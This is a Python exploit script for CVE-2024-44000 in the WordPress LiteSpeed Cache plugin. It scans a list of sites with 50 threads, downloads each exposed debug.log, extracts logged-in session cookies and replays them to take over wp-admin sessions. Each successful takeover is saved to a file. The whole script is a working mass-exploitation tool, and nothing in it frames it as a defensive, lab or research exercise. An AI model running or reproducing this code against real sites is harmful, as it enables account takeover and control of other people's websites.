import re
import requests
import argparse
from urllib.parse import urljoin, quote
from multiprocessing.dummy import Pool as ThreadPool
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Function to perform an HTTP GET request and return response
def http_get(url):
    try:
        response = requests.get(url, timeout=10, allow_redirects=False)
        return response.status_code, response.text
    except requests.RequestException as e:
        return None, str(e)

# Function to extract cookies from log response
def extract_cookies(log_data):
    cookies = []
    for line in log_data.splitlines():
        match = re.search(r'Cookie: (.*)', line)
        if match:
            cookies.append(match.group(1))
    return cookies

# Function to extract session cookies
def extract_session_cookies(cookies):
    session_cookies = []
    for cookie in cookies:
        match = re.search(r'wordpress_logged_in_[^=]+=[^;]+', cookie)
        if match:
            session_cookies.append(match.group(0))
    return session_cookies

# Function to check cookies for a given URL
def extract_and_use_cookies(url):
    log_url = urljoin(url, "wp-content/debug.log")
    response_code, log_data = http_get(log_url)

    if response_code == 200:
        print(f"{Fore.GREEN}[+] Successfully accessed the debug log file for {url}")

        cookies = extract_cookies(log_data)
        session_cookies = extract_session_cookies(cookies)

        if session_cookies:
            for admin_cookie in session_cookies:
                cookie_name, cookie_value = admin_cookie.split('=')
                session = requests.Session()
                session.cookies.set(cookie_name, cookie_value)
                admin_url = urljoin(url, "wp-admin/")
                admin_response = session.get(admin_url, allow_redirects=False)

                if admin_response.status_code == 302:  # HTTP 302 indicates a redirect (possibly logged in)
                    hijacked_url = f"{urljoin(url, 'wp-login.php')}?redirect_to={quote(admin_url + f'?{cookie_name}={cookie_value}')}&reauth=1"
                    cookie_set_url = f"{urljoin(url, 'wp-login.php')}?cookie={cookie_name}={cookie_value}"
                    
                    print(f"{Fore.GREEN}[+] Successfully hijacked admin session for {url} with cookie: {admin_cookie}")
                    
                    # Save the valid site, hijacked admin session URL, and cookie set URL to valid.txt
                    with open('valid.txt', 'a') as valid_file:
                        valid_file.write(f"Site: {url}\n")
                        valid_file.write(f"Hijacked Admin Session URL: {hijacked_url}\n")
                        valid_file.write(f"Cookie Set URL: {cookie_set_url}\n")
                        valid_file.write("="*50 + "\n")
                    
                    return True
                else:
                    print(f"{Fore.RED}[-] Failed to hijack admin session for {url} with cookie: {admin_cookie}")
        else:
            print(f"{Fore.RED}[-] No session cookies found in the log file for {url}")
    else:
        print(f"{Fore.RED}[-] Failed to access the debug log file for {url}. Status code: {response_code}")

    return False

# Function to handle the URL checking process
def check_url(url):
    url = url.strip()
    extract_and_use_cookies(url)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LiteSpeed Cache Cookie Extractor and Admin Login (CVE-2024-44000)")
    parser.add_argument("file", help="File containing list of WordPress site URLs")
    args = parser.parse_args()

    # Open the input file and read all URLs
    with open(args.file, 'r') as file:
        urls = file.readlines()

    # Create a thread pool with 50 threads
    pool = ThreadPool(50)

    # Start the checking process for each URL
    pool.map(check_url, urls)

    # Close the pool and wait for the work to finish
    pool.close()
    pool.join()

    print(f"{Fore.CYAN}[+] Checking completed. Valid sites saved to valid.txt")
